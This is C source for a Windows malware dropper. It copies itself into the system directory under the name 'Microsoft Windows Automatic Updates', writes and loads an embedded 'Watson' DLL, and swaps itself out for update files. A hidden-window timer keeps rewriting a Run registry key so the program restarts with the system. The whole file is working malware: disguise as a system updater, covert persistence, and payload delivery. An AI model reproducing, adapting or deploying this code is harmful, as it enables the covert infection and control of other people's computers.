/*

	Local Host for Watson
	---------------------
	First self-copies to Sys Directory,
	then loads Watson DLL and calls the 
	exported function "ActivateSystem".

*/

#include <windows.h>
#include <string.h>
#include "watson.h"

/* functions */
BOOL RunProcess(char *ProcName);
void AsUsual();
BOOL CheckForUpdate();
void RegLocker();
LRESULT CALLBACK RegWndProc   (HWND, UINT, WPARAM, LPARAM);
void CALLBACK RegTimer (HWND, UINT, UINT, DWORD);
DWORD WINAPI ActivateSystem(PVOID pParam);

/* globals */
HINSTANCE AppInstance = NULL;
const char AppName[] = "Microsoft® Windows® Automatic Updates";

/* macros */
#define MSG(M) MessageBox(NULL,"",M,0);

/* constants */
#define REG_DELAY 3000
#define STRING_APPNAME "win32upd.exe"
#define STRING_DLLNAME "win32osi.dll"
#define STRING_UPDNAME "osi32upd.sys"
#define STRING_TMPNAME "win32bit.exe"

int WINAPI WinMain(HINSTANCE hInstance, 
				   HINSTANCE hPrevInstance,
				   LPSTR lpCmdLine,
				   int nCmdShow)
{
	AppInstance = hInstance;
	char AppName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),AppName,MAX_PATH);

	char SysAppName[MAX_PATH];
	if(!GetSystemDirectory(SysAppName,MAX_PATH))
		strcpy(SysAppName,"C:\\");
	strcat(SysAppName,"\\");
	strcat(SysAppName,STRING_APPNAME);

	// i'm giving clean-up time for my predecessor (see Update function)
	Sleep(1500); // 1.5 seconds ought to be enough

	if(!strcmp(AppName,SysAppName))
		AsUsual();
	else {
		CopyFile(AppName, SysAppName, TRUE);
		if(!RunProcess(SysAppName))
			AsUsual();
	}
	return 0;
}

BOOL RunProcess(char *ProcName)
{
	BOOL Success = FALSE;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if(CreateProcess( NULL, ProcName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi))
	Success = TRUE;
	//WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

	return Success;
}

void AsUsual()
{
	if(CheckForUpdate())
		return;
	DWORD WatsonThreadId = 0;
	CreateThread(NULL,0,ActivateSystem,NULL,0,&WatsonThreadId);
	RegLocker();
}

BOOL CheckForUpdate()
{
	char UpdName[MAX_PATH];
	if(!GetSystemDirectory(UpdName,MAX_PATH))
		strcpy(UpdName,"C:\\");
	strcat(UpdName,"\\");
	strcat(UpdName,STRING_UPDNAME);

	HANDLE JustCheckin = CreateFile(UpdName,GENERIC_READ,
	FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(JustCheckin == INVALID_HANDLE_VALUE)
	     return FALSE; // no update
	else {
		CloseHandle(JustCheckin);
		char NewName[MAX_PATH];
		if(!GetSystemDirectory(NewName,MAX_PATH))
			strcpy(NewName,"C:\\");
		strcat(NewName,"\\");
		strcat(NewName,STRING_TMPNAME);
		CopyFile(UpdName,NewName,FALSE);
		DeleteFile(UpdName);
		if(RunProcess(NewName))
			return TRUE;
		else
			return FALSE;
	}
}

/*****************.
| Registry Locker |
`*****************/

void RegLocker()
{
	HWND        hwnd ;
	MSG         msg ;
	WNDCLASS    wndclass ;

	wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
	wndclass.lpfnWndProc   = RegWndProc ;
	wndclass.cbClsExtra    = 0 ;
	wndclass.cbWndExtra    = 0 ;
	wndclass.hInstance     = AppInstance ;
	wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
	wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
	wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
	wndclass.lpszMenuName  = NULL ;
	wndclass.lpszClassName = AppName ;

	if (!RegisterClass (&wndclass))
		return;

	hwnd = CreateWindow (AppName, AppName,
						WS_OVERLAPPEDWINDOW,
						CW_USEDEFAULT, CW_USEDEFAULT,
						CW_USEDEFAULT, CW_USEDEFAULT,
						NULL, NULL, AppInstance, NULL) ;

	 //ShowWindow(hwnd, nCmdShow);

	while (GetMessage (&msg, NULL, 0, 0))
	{
		TranslateMessage (&msg) ;
		DispatchMessage (&msg) ;
	}
	return;
}

LRESULT CALLBACK RegWndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SetTimer(hwnd, 1, REG_DELAY, RegTimer);
		break;
	case WM_CLOSE:
		KillTimer (hwnd, 1);
		DestroyWindow(hwnd);
		break ;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

void CALLBACK RegTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	MessageBeep(-1);
	char AppName[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),AppName,MAX_PATH);
	HKEY Key;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE, &Key);
	RegSetValueEx(Key, "Automatic Updates", 0, REG_SZ, 
	(unsigned char *)AppName, strlen(AppName));
	RegCloseKey(Key);
}

/***************.
| Watson Loader |
`***************/

DWORD WINAPI ActivateSystem(PVOID pParam)
{
	char DllName[MAX_PATH];
	if(!GetSystemDirectory(DllName,MAX_PATH))
		strcpy(DllName,"C:\\");
	SetCurrentDirectory(DllName);
	strcat(DllName,"\\");
	strcat(DllName,STRING_DLLNAME);

	HANDLE hWrite = CreateFile(DllName, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hWrite != INVALID_HANDLE_VALUE)
	{
		unsigned long int BytesWritten;
		WriteFile(hWrite, data, WATSON_SZ, &BytesWritten, NULL);
		CloseHandle(hWrite);
		// Activate Watson !
		HINSTANCE hDLL = NULL;
		hDLL = LoadLibrary(DllName);
		if(hDLL != NULL) {
			FARPROC pDLL= NULL;
			pDLL = GetProcAddress(hDLL, TEXT("ActivateSystem"));
			if(pDLL != NULL)
				pDLL();
		}
	}
	return 0;
}
